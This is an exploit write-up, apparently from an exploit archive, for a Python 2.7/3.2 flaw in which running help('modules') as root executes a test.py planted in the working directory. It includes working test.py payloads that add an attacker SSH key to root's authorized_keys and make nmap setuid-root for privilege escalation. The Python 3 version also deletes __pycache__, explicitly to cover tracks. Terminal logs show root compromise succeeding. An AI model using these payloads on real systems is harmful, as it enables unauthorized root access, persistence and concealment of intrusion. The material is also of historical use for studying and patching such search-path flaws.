@@ -1,0 +1,278 @@
+# Exploit Title: Python untrusted search path/code execution vulnerability
+# Date: 7.6.12
+# Exploit Author: rogueclown
+# Vendor Homepage: http://www.python.org
+# Software Link: http://www.python.org/getit/releases/
+# Version: python 2.7.2 and python 3.2.1
+# Tested on: linux (my test machine was OpenSUSE 12.1)
+#
+# This is an expansion on www.exploit-db.com/exploits/19523/ -- a big thanks,
+# and the lion's share of the credit, to ShadowHatesYou (Shadow@SquatThis.net).
+# They found the vulnerability; i just found a more generalized application
+# of it.
+# 
+# Basically, i found that it's not just python-wrapper that executes a test.py
+# script within the current working directory when help('modules') is run --
+# python itself does that.  In python 2, it works just as ShadowHatesYou showed
+# it in his python-wrapper exploit.
+#
+# This still works in python 3, but you have to do a bit more to cover your
+# tracks.  In the working directory, python 3 drops a __pycache__ directory 
+# with a .pyc file inside it.  Most of the bytecode in there is not human
+# readable, but it displays the shell command called by the script in 
+# plaintext, making it pretty obvious that something funny happened.  However,
+# you can get around this by making sure that your test.py script removes the
+# __pycache__ directory from the working directory. 
+#
+# rogueclown
+# rogueclown@rogueclown.net
+# 7.6.12
+
+############
+# PYTHON 2 #
+############
+
+adalia@bukkit:~/security/pythonwrapper> ls -hl test.py
+-rw-r--r-- 1 adalia users 144 Jul  4 15:47 test.py
+adalia@bukkit:~/security/pythonwrapper> cat test.py
+#!/usr/bin/python
+
+import os
+
+os.system("/bin/echo $(echo ssh-rsa rogueclown washere >> /root/.ssh/authorized_keys); chmod 4755 /usr/bin/nmap")
+adalia@bukkit:~/security/pythonwrapper> ls -hl /usr/bin/nmap
+-rwxr-xr-x 1 root root 1.4M Oct 29  2011 /usr/bin/nmap
+adalia@bukkit:~/security/pythonwrapper> su
+Password: 
+bukkit:/home/adalia/security/pythonwrapper # ls /root/.ssh/authorized_keys
+ls: cannot access /root/.ssh/authorized_keys: No such file or directory
+bukkit:/home/adalia/security/pythonwrapper # python
+Python 2.7.2 (default, Aug 19 2011, 20:41:43) [GCC] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> help('modules')
+
+Please wait a moment while I gather a list of all available modules...
+
+
+/usr/lib64/python2.7/site-packages/gobject/constants.py:24: Warning: g_boxed_type_register_static: assertion `g_type_from_name (name) == 0' failed
+  import gobject._gobject
+/usr/lib64/python2.7/site-packages/twisted/words/im/__init__.py:8: UserWarning: twisted.im will be undergoing a rewrite at some point in the future.
+  warnings.warn("twisted.im will be undergoing a rewrite at some point in the future.")
+** Message: pygobject_register_sinkfunc is deprecated (GstObject)
+Alacarte            abc                 gtkunixprint        readline
+BaseHTTPServer      aifc                gzip                repr
+Bastion             antigravity         hashlib             resource
+BeautifulSoup       anydbm              heapq               rexec
+BeautifulSoupTests  argparse            hmac                rfc822
+CDROM               array               hotshot             rlcompleter
+CGIHTTPServer       ast                 hpmudext            robotparser
+ConfigParser        asynchat            htmlentitydefs      rpm
+Cookie              asyncore            htmllib             runpy
+Crypto              atexit              httplib             satsolver
+DLFCN               atk                 httplib2            scanext
+DocXMLRPCServer     atom                ieee1284            sched
+HTMLParser          audiodev            ihooks              scout
+IN                  base64              imaplib             select
+MimeWriter          bdb                 imghdr              serial
+OpenSSL             beaker              imp                 sets
+PAM                 binascii            importlib           setuptools
+PyQt4               binhex              imputil             sgmllib
+Queue               bisect              inspect             sha
+SimpleHTTPServer    bsddb               io                  shelve
+SimpleXMLRPCServer  butterfly           itertools           shlex
+SocketServer        bz2                 json                shutil
+StringIO            cPickle             keyword             signal
+TYPES               cProfile            lib2to3             simplejson
+UserDict            cStringIO           libproxy            sip
+UserList            cairo               libvboxjxpcom       site
+UserString          calendar            libxml2             smbc
+VBoxAuth            cgi                 libxml2mod          smtpd
+VBoxAuthSimple      cgitb               linecache           smtplib
+VBoxDD              chunk               linuxaudiodev       sndhdr
+VBoxDD2             cmath               locale              socket
+VBoxDDU             cmd                 logging             spwd
+VBoxDbg             code                louie               sqlite3
+VBoxGuestControlSvc codecs              macpath             sre
+VBoxGuestPropSvc    codeop              macurl2path         sre_compile
+VBoxHeadless        coherence           mad                 sre_constants
+VBoxKeyboard        collections         mailbox             sre_parse
+VBoxNetDHCP         colorsys            mailcap             ssl
+VBoxOGLhostcrutil   commands            mako                stat
+VBoxOGLhosterrorspu compileall          markupbase          statvfs
+VBoxOGLrenderspu    compiler            markupsafe          string
+VBoxPython          contextlib          marshal             stringold
+VBoxPython2_7       cookielib           math                stringprep
+VBoxREM             copy                md5                 strop
+VBoxRT              copy_reg            mhlib               struct
+VBoxSDL             crypt               mimetools           subprocess
+VBoxSharedClipboard csv                 mimetypes           sunau
+VBoxSharedCrOpenGL  ctypes              mimify              sunaudio
+VBoxSharedFolders   cups                mmap                symbol
+VBoxVMM             cupsext             modulefinder        symtable
+VBoxXPCOM           cupshelpers         multifile           sys
+VBoxXPCOMC          curl                multiprocessing     sysconfig
+VirtualBox          datetime            mutagen             syslog
+Xlib                dbhash              mutex               tabnanny
+_LWPCookieJar       dbus                mygpoclient         tarfile
+_MozillaCookieJar   dbus_bindings       netrc               telepathy
+__builtin__         decimal             new                 telnetlib
+__future__          difflib             nis                 tempfile
+_abcoll             dircache            nntplib             termios
+_ast                dis                 ntpath              textwrap
+_bisect             distutils           nturl2path          this
+_bsddb              doctest             numbers             thread
+_codecs             drv_libxml2         numpy               threading
+_codecs_cn          dsextras            opcode              time
+_codecs_hk          dumbdbm             operator            timeit
+_codecs_iso2022     dummy_thread        optparse            toaiff
+_codecs_jp          dummy_threading     os                  token
+_codecs_kr          easy_install        os2emxpath          tokenize
+_codecs_tw          email               ossaudiodev         trace
+_collections        encodings           packagekit          traceback
+_csv                errno               pango               tty
+_ctypes             exceptions          pangocairo          twisted
+_ctypes_test        eyeD3               papyon              types
+_dbus_bindings      fcntl               parser              unicodedata
+_dbus_glib_bindings feedparser          pcardext            unittest
+_elementtree        filecmp             pdb                 uno
+_functools          fileinput           pickle              unohelper
+_hashlib            fnmatch             pickletools         urlgrabber
+_heapq              formatter           pipes               urllib
+_hotshot            fpformat            pkg_resources       urllib2
+_io                 fractions           pkgutil             urlparse
+_json               ftplib              platform            user
+_locale             functools           plistlib            uu
+_lsprof             future_builtins     popen2              uuid
+_md5                gc                  poplib              vboxapi
+_multibytecodec     gdata               posix               vboxshell
+_multiprocessing    genericpath         posixfile           volkeys
+_pyio               getopt              posixpath           warnings
+_random             getpass             pprint              wave
+_satsolver          gettext             profile             weakref
+_sha                gi                  pstats              webbrowser
+_sha256             gio                 pty                 whichdb
+_sha512             glib                pwd                 wsgiref
+_socket             glob                py_compile          xdg
+_sqlite3            gmenu               pyclbr              xdrlib
+_sre                gnome_sudoku        pycurl              xml
+_ssl                gnomekeyring        pydoc               xmllib
+_strptime           gobject             pydoc_data          xmlrpclib
+_struct             gpod                pyexpat             xxsubtype
+_symtable           gpodder             pygst               zeitgeist
+_testcapi           grp                 pygtk               zipfile
+_threading_local    gst                 pynotify            zipimport
+_warnings           gstoption           quopri              zlib
+_weakref            gtk                 random              zope
+_weakrefset         gtktrayicon         re                  
+
+Enter any module name to get more help.  Or, type "modules spam" to search
+for modules whose descriptions contain the word "spam".
+
+>>> exit()
+bukkit:/home/adalia/security/pythonwrapper # ls -hl /usr/bin/nmap
+-rwsr-xr-x 1 root root 1.4M Oct 29  2011 /usr/bin/nmap
+bukkit:/home/adalia/security/pythonwrapper # cat /root/.ssh/authorized_keys
+ssh-rsa rogueclown washere
+bukkit:/home/adalia/security/pythonwrapper # 
+
+
+############
+# PYTHON 3 #
+############
+
+adalia@bukkit:~/security/pythonwrapper> ls -hl test.py
+-rw-r--r-- 1 adalia users 169 Jul  4 15:51 test.py
+adalia@bukkit:~/security/pythonwrapper> cat test.py
+#!/usr/bin/python
+
+import os
+
+os.system("/bin/echo $(echo ssh-rsa rogueclown washere >> /root/.ssh/authorized_keys); chmod 4755 /usr/bin/nmap; /bin/rm -rf __pycache__")
+adalia@bukkit:~/security/pythonwrapper> ls -hl /usr/bin/nmap
+-rwxr-xr-x 1 root root 1.4M Oct 29  2011 /usr/bin/nmap
+adalia@bukkit:~/security/pythonwrapper> su
+Password: 
+bukkit:/home/adalia/security/pythonwrapper # ls /root/.ssh/authorized_keys
+ls: cannot access /root/.ssh/authorized_keys: No such file or directory
+bukkit:/home/adalia/security/pythonwrapper # python3
+Python 3.2.1 (default, Jul 18 2011, 16:24:40) [GCC] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> help('modules')
+
+Please wait a moment while I gather a list of all available modules...
+
+
+CDROM               binascii            inspect             shelve
+DLFCN               binhex              io                  shlex
+IN                  bisect              itertools           shutil
+TYPES               builtins            json                signal
+__future__          bz2                 keyword             site
+_abcoll             cProfile            linecache           smtpd
+_ast                calendar            locale              smtplib
+_bisect             cgi                 logging             sndhdr
+_codecs             cgitb               macpath             socket
+_codecs_cn          chunk               macurl2path         socketserver
+_codecs_hk          cmath               mailbox             spwd
+_codecs_iso2022     cmd                 mailcap             sqlite3
+_codecs_jp          code                marshal             sre_compile
+_codecs_kr          codecs              math                sre_constants
+_codecs_tw          codeop              mimetypes           sre_parse
+_collections        collections         mmap                ssl
+_compat_pickle      colorsys            modulefinder        stat
+_csv                compileall          multiprocessing     string
+_ctypes             concurrent          netrc               stringprep
+_datetime           configparser        nis                 struct
+_dummy_thread       contextlib          nntplib             subprocess
+_elementtree        copy                ntpath              sunau
+_functools          copyreg             nturl2path          symbol
+_hashlib            crypt               numbers             symtable
+_heapq              csv                 opcode              sys
+_io                 ctypes              operator            sysconfig
+_json               datetime            optparse            syslog
+_locale             decimal             os                  tabnanny
+_lsprof             difflib             os2emxpath          tarfile
+_markupbase         dis                 ossaudiodev         telnetlib
+_multibytecodec     distutils           parser              tempfile
+_multiprocessing    doctest             pdb                 termios
+_pickle             dummy_threading     pickle              textwrap
+_posixsubprocess    email               pickletools         this
+_pyio               encodings           pipes               threading
+_random             errno               pkgutil             time
+_socket             fcntl               platform            timeit
+_sqlite3            filecmp             plistlib            token
+_sre                fileinput           poplib              tokenize
+_ssl                fnmatch             posix               trace
+_string             formatter           posixpath           traceback
+_strptime           fractions           pprint              tty
+_struct             ftplib              profile             turtle
+_symtable           functools           pstats              types
+_thread             gc                  pty                 unicodedata
+_threading_local    genericpath         pwd                 unittest
+_warnings           getopt              py_compile          urllib
+_weakref            getpass             pyclbr              uu
+_weakrefset         gettext             pydoc               uuid
+abc                 glob                pydoc_data          warnings
+aifc                grp                 queue               wave
+antigravity         gzip                quopri              weakref
+argparse            hashlib             random              webbrowser
+array               heapq               re                  wsgiref
+ast                 hmac                readline            xdrlib
+asynchat            html                reprlib             xxlimited
+asyncore            http                resource            xxsubtype
+atexit              imaplib             rlcompleter         zipfile
+audioop             imghdr              runpy               zipimport
+base64              imp                 sched               zlib
+bdb                 importlib           select              
+
+Enter any module name to get more help.  Or, type "modules spam" to search
+for modules whose descriptions contain the word "spam".
+
+>>> exit()
+bukkit:/home/adalia/security/pythonwrapper # ls -hl /usr/bin/nmap
+-rwsr-xr-x 1 root root 1.4M Oct 29  2011 /usr/bin/nmap
+bukkit:/home/adalia/security/pythonwrapper # cat /root/.ssh/authorized_keys
+ssh-rsa rogueclown washere
+bukkit:/home/adalia/security/pythonwrapper # ls __pycache__
+ls: cannot access __pycache__: No such file or directory
+bukkit:/home/adalia/security/pythonwrapper # 
+
